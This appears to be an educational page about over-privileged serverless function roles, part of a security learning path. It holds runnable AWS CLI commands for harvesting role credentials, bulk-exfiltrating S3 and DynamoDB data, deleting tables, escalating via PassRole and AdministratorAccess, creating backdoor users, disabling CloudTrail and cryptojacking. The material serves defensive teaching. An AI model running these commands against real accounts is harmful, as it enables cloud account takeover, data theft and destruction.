# SAS-4: Over-Privileged Function Permissions & Roles - Attack Vectors

## Table of Contents
- [Understanding Over-Privilege Attack Vectors](#understanding-over-privilege-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining One Function into the Whole Account](#chaining-one-function-into-the-whole-account)

## Understanding Over-Privilege Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix over-privileged roles in serverless applications you own or are authorised to test.

Over-privilege is not the way in—it is the way *onward*. The attacker first gets code execution inside a function (through [event-data injection](../SAS01-Function-Event-Data-Injection/attack-vectors.md), a vulnerable dependency, or a leaked secret). At that instant the function's execution-role credentials become the attacker's credentials. Everything that follows is decided by one thing: how broad that role is.

A tightly scoped role means the attacker is trapped in a single read-only table. A wildcard role means the attacker inherits the keys to the account. The exploit is the same; the outcome is entirely a function of the permissions.

The attacker's goal in this category is usually one of:
- Read the role's temporary credentials out of the execution environment.
- Enumerate what the role can do, then use every permission it should never have had.
- Pivot across services and functions, and—if IAM permissions are present—escalate to full administrative control and persistence.

### Core Attack Flow

```
1. Get execution inside a function
   ↓
   Injection / vulnerable dependency / leaked secret -> code runs as the function
2. Harvest the role credentials
   ↓
   Read AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY / AWS_SESSION_TOKEN
   from the environment / credentials endpoint
3. Enumerate what the role can do
   ↓
   Probe s3:ListAllMyBuckets, dynamodb:ListTables, lambda:ListFunctions,
   iam:Get*/List*, sts:GetCallerIdentity
4. Abuse / Pivot / Escalate
   ↓
   Read all data, invoke other functions, PassRole to a bigger role,
   attach admin policy, create back-door resources
```

## Common Attack Patterns

### 1. Harvesting the Execution Role's Credentials

The platform hands the function short-lived credentials for its role through the environment. Any code execution can read them.

```bash
# Inside a compromised function, the role's keys are simply environment variables:
echo $AWS_ACCESS_KEY_ID $AWS_SECRET_ACCESS_KEY $AWS_SESSION_TOKEN
# or fetched from the runtime credentials endpoint / metadata service

# The attacker exports them and now acts AS the function, from anywhere:
aws sts get-caller-identity     # confirms which role was captured
```

**Payoff**: the attacker now holds the exact permissions of the role. From here, the breadth of the role decides everything.

### 2. Wildcard Action Abuse (`s3:*` / `dynamodb:*`)

A role scoped with service wildcards lets the attacker use actions the function never calls.

```bash
# Role grants s3:* on * — the function only ever did GetObject on one bucket.
aws s3 ls                                   # list EVERY bucket in the account
aws s3 cp s3://finance-backups/ . --recursive   # bulk exfiltration
aws s3api put-bucket-policy --bucket public-site ...  # tamper / defacement
# dynamodb:* on * — read or destroy every table:
aws dynamodb scan --table-name Customers    # full record dump
aws dynamodb delete-table --table-name Audit  # destruction
```

**Payoff**: bulk read, tampering, and destruction across resources that have nothing to do with the compromised function.

### 3. Reading Every Bucket and Table (`Resource: "*"`)

Even without action wildcards, `Resource: "*"` turns a narrow action into an account-wide one.

```bash
# Role grants ONLY s3:GetObject, but on Resource: "*"
for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
  aws s3 sync s3://$b/ ./loot/$b/          # read every object in every bucket
done
```

**Payoff**: a single, seemingly-minimal action becomes total data exposure because the resource was not pinned to a specific ARN.

### 4. Invoking and Abusing Other Functions (`lambda:InvokeFunction`)

With invoke permission on `*`, the compromised function becomes a remote control for the whole application.

```bash
aws lambda list-functions                          # map the app
aws lambda invoke --function-name payoutProcessor \
    --payload '{"amount":100000,"to":"attacker"}' out.json  # abuse business logic
aws lambda get-function --function-name adminTool  # download code + env for secrets
```

**Payoff**: the attacker drives other functions' privileged logic, and `get-function` leaks their source and environment variables (often more secrets).

### 5. Privilege Escalation via `iam:PassRole`

Unscoped `PassRole` plus the ability to create a compute resource lets the attacker borrow a bigger role.

```bash
# The function's own role is limited, but it can PassRole on * and create functions.
aws iam list-roles                                 # find a fat role, e.g. AdminRole
aws lambda create-function --function-name pwn \
    --role arn:aws:iam::ACCT:role/AdminRole \      # pass a role bigger than our own
    --runtime python3.12 --handler p.handler --zip-file fileb://p.zip
aws lambda invoke --function-name pwn out.json     # now running AS AdminRole
```

**Payoff**: the attacker escapes the function's limited role and operates as a far more privileged one. This is one of the most common cloud escalation primitives.

### 6. Self-Escalation via IAM Write Permissions (`iam:*`)

If the role can edit IAM, it can simply grant itself administrator.

```bash
# Attach a managed admin policy to the role we already control:
aws iam attach-role-policy --role-name FuncRole \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Or quietly widen an existing customer-managed policy with a new default version:
aws iam create-policy-version --policy-arn arn:aws:iam::ACCT:policy/FuncPolicy \
    --policy-document file://allow-star.json --set-as-default
```

**Payoff**: full administrative control of the account from a function that was supposed to resize images.

### 7. Cross-Service Pivot

A role that bundles many services lets a single foothold reach all of them.

```bash
aws secretsmanager list-secrets                    # secrets the function never read
aws secretsmanager get-secret-value --secret-id prod/db/master
aws sqs receive-message --queue-url .../jobs        # read/poison the work queue
aws kms decrypt --ciphertext-blob fileb://blob      # decrypt with any key on *
```

**Payoff**: database master credentials, message tampering, and decryption—because one role spanned data, messaging, secrets, and keys.

### 8. Creating Resources for Abuse (Cryptojacking)

Permission to create compute is routinely turned into someone else's mining rig on the victim's bill.

```bash
# Role can run/create compute on *:
aws ec2 run-instances --image-id ami-xxxx --instance-type g5.48xlarge --count 20
# or deploy many new functions/containers that mine and phone home
```

**Payoff**: large fraudulent compute bills and a foothold that regenerates itself.

### 9. Persistence and Defense Evasion

Broad roles often include the very permissions needed to stay hidden and stay in.

```bash
aws iam create-user --user-name svc-backup         # back-door identity
aws iam create-access-key --user-name svc-backup    # long-lived keys
aws cloudtrail stop-logging --name org-trail         # blind the auditors
aws lambda update-function-code --function-name cron --zip-file fileb://backdoor.zip
```

**Payoff**: durable access that survives the original fix, plus disabled logging to hide it.

### 10. Shared-Role Blast Radius

When many functions share one role, the attacker does not even need to compromise a sensitive function—the weakest one carries the same power.

```
Compromise: healthCheck  (trivial function, no data of its own)
Role held:  the shared account-wide role
Result:     healthCheck's credentials == every other function's credentials
```

**Payoff**: the least-defended function becomes the entry point to everything, because permission was assigned to the group rather than the function.

## Chaining One Function into the Whole Account

Individually the steps are ordinary API calls; chained, they walk from one bug to account takeover:

```
Injection in a public function        -> code execution inside the function
        +
Read AWS_* env credentials            -> attacker now holds the role
        +
Role has s3:* / dynamodb:* on *        -> exfiltrate every bucket and table
        =  full data breach, no second exploit needed
```

The escalation chain when IAM permissions are present:

```
Foothold role can iam:PassRole on *    -> pass AdminRole to a new function
        -> invoke it, now running as Admin
        -> attach AdministratorAccess, create back-door user
        -> stop CloudTrail
        =  persistent, hidden, account-wide control
```

## Key Takeaways

1. **Over-privilege is the multiplier, not the entry**—the exploit gets code running; the role decides how far it reaches.
2. **Role credentials are in the environment**—any code execution inside a function can harvest and reuse them anywhere.
3. **Wildcards convert one action into all resources**—`*` on action or resource is the difference between one table and the whole account.
4. **`PassRole` and `iam:*` are escalation, not plumbing**—they let a tiny function become account administrator.
5. **Shared roles mean the weakest function owns you**—the blast radius is defined by the group, so scope per function.

## Next Steps

- **[Prevention Guide](prevention.md)**: Scope every function to least privilege so these chains dead-end
- **[Code Examples](examples.md)**: Vulnerable vs. secure IAM policies and per-function roles
- **[Serverless Learning Path](/learn/serverless)**: Continue the OWASP Serverless Top 10
- **[Practice](/practice)**: Apply what you've learned in hands-on exercises
